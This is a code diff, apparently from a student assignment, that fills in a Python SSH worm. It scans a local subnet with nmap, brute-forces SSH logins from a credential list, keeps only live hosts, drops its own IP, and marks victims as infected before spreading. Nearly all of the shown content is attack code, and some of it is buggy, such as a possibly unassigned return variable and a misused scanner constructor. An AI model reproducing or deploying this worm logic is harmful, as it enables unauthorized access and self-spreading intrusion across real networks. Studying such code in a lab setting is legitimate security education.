@@ -1,3 +1,4 @@
+from genericpath import getmtime
 import os
 import sys
 import socket
@@ -9,9 +10,10 @@ import socket
 import fcntl
 import struct
 import os.path
+import netifaces
 from netifaces import interfaces, ifaddresses, AF_INET
 
-nmScan = nmap.PortScanner()
+nmScan = nmap.PortScanner('10.0.0.0/23', arguments='--open')
 
 # The list of credentials to attempt
 credList = [
@@ -135,14 +137,16 @@ def tryCredentials(host, userName, password, sshClient):
 	try:
 		sshClient.connect(host, username=userName, password=password)
 	except socket.error:
+		#probably the server is down or is not running SSH
 		print("Error: Host is unreachable")
 		return 3
 	except paramiko.SSHException:
-		print("Error: Inccorrect credentials. Failed to establsh SSH connection.")
+		#probably wrong credentials
+		print("Error: Incorrect credentials. Failed to establsh SSH connection.")
 		return 1
-
-	
+		
 	return 0
+	#/Desirae Prather
 
 
 ###############################################################
@@ -181,14 +185,15 @@ def attackSystem(host):
 		# instance of the SSH connection
 		# to the remote system. 
 
+
 		#Desirae Prather
 		if tryCredentials(host=host,userName=username,password=password,sshClient=ssh) == 0:
-			print("Found and instance of the SSH connection")
-			return (ssh.connect(host, username=username, password=password))
+			print("Found and return instance of the SSH connection")
+			attemptResults = (host, username, password, ssh)
 		#	/Desirae Prather
 			
 	# Could not find working credentials
-	return (None)	
+	return attemptResults
 
 ####################################################
 # Returns the IP of the current system
@@ -201,21 +206,23 @@ def getMyIP(interface):
 	# TODO: Change this to retrieve and
 	# return the IP of the current system.
 	
-	# run a loop to print all the found result about the ports
 	# kevin
-	ip_list = []
-	for interface in interfaces():
-		try:
-			for link in ifaddresses(interface)[AF_INET]:
-				ip_list.append(link['addr'])
-				print(ip_list)
-		
-		except KeyError:
-			print("(exception caught) there was an error that i'm ignoring lol")
+	ipAddr = None
+	for netFace in interface:
+
+			# The IP address of the interface
+			tempAddr = netifaces.ifaddresses(netFace)[2][0]['addr']
+
+			# Get the IP address
+			if not tempAddr == "127.0.0.1":
+
+				# Save the IP addrss and break
+				ipAddr = tempAddr
+				break
 	# /kevin
 		# print('the host : %s (%s)' % (host, nmScan[host].hostname()))
 		# the output in the GNS3 Topology thing is ('127.0.0.1','192.168.1.2'), always
-	return None
+	return ipAddr
 
 
 #######################################################
@@ -228,17 +235,17 @@ def getHostsOnTheSameNetwork():
 	# for hosts on the same network
 	# and return the list of discovered
 	# IP addresses.	
-	
-	for host in nmScan.all_hosts():
-		print('the host : %s (%s)' % (host, nmScan[host].hostname()))
-		print('state : %s' % nmScan[host].state())
-		for proto in nmScan[host].all_protocols():
-			print('Protocol : %s' % proto)
-			lport = nmScan[host][proto].keys()
-			# lport.sort()
-			for port in lport:
-				print ('pOrt : %s\tstate : %s' % (port, nmScan[host][proto][port]['state']))
-	pass
+	# kevin
+	hostInfo = nmScan.all_hosts()
+	liveHosts = []
+	for host in hostInfo:
+		# uncomment this to add even non running hosts
+		# liveHosts.append(host)
+		# otherwise we're only going to add running hosts
+		if nmScan[host].state() == "up":
+			liveHosts.append(host)
+	# /kevin
+	return liveHosts
 
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
@@ -253,10 +260,21 @@ if len(sys.argv) < 2:
 	
 	# TODO: If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
-	# Otherwise, proceed with malice. 
+	# Otherwise, proceed with malice.
+	#Desirae Prather 
+	if isInfectedSystem()==1:
+		exit(1)
+	else:
+		markInfected()
+	#/DesiraePrather
+		
 	pass
 
 # TODO: Get the IP of the current system
+#Desirae Prather
+interface = interfaces()
+currentIP = getMyIP(interface)
+#/Desirae Prather
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
@@ -264,7 +282,9 @@ networkHosts = getHostsOnTheSameNetwork()
 # TODO: Remove the IP of the current system
 # from the list of discovered systems (we
 # do not want to target ourselves!).
-
+# yujin
+networkHosts.remove(currentIP)
+# /yujin
 print("Found hosts: ", networkHosts)
 
 
